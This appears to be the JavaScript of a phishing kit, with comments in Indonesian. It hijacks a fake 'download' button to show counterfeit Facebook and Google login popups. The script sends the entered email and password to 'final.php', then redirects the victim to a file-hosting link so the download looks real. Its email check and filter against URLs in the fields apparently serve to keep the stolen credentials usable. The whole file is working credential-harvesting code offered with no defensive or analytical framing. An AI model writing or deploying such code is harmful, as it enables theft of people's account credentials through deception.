function Loginpopunder() {
    console.log('Loginpopunder dipanggil');
    $('.popup-login, .popup-tirzz').removeClass('visible');
    $('.popup-login.selectLogin').addClass('visible');
}

function OpenFacebook() {
    $('.popup-login, .popup-tirzz').removeClass('visible');
    $('.popup-login.loginxFacebook').addClass('visible');
}

function CloseFacebook() {
    $('.popup-login.loginxFacebook').removeClass('visible');
}

function OpenGoogle() {
    $('.popup-login, .popup-tirzz').removeClass('visible');
    $('.popup-tirzz.tirzz-google').addClass('visible');
}

function CloseGoogle() {
    $('.popup-tirzz.tirzz-google').removeClass('visible');
}

function closeSelect() {
    $('.popup-login.selectLogin').removeClass('visible');
}

$(document).ready(function () {
    // Tombol download
    $('#opengp, .version-download-btn').on('click', function(e) {
        e.preventDefault();
        Loginpopunder();
    });

    // Pilihan login
    $('#chooseGoogle').click(function(e) {
        e.preventDefault();
        OpenGoogle();
    });
    $('#chooseFB').click(function(e) {
        e.preventDefault();
        OpenFacebook();
    });

    // Validasi dan submit form
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

    function handleFormSubmit(formSelector, emailSelector, passwordSelector, loginType) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email    = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }
                
                $.post("final.php", {
                    email: email,
                    password: password,
                    login: loginType
                });
                window.location.href = "https://gofile.io/d/fHPLH2";
            }
        });
    }
    
    handleFormSubmit("#FromxFacebook", 'input[name="email"]', 'input[name="password"]', "Facebook");
    handleFormSubmit("#FromxGoogle", "#email_gp", "#password_gp", "Google");

    // Tutup popup jika klik di background
    $(document).on('click', '.popup-login, .popup-tirzz', function(e) {
        if ($(e.target).hasClass('popup-login') || $(e.target).hasClass('popup-tirzz')) {
            $(this).removeClass('visible');
        }
    });
});
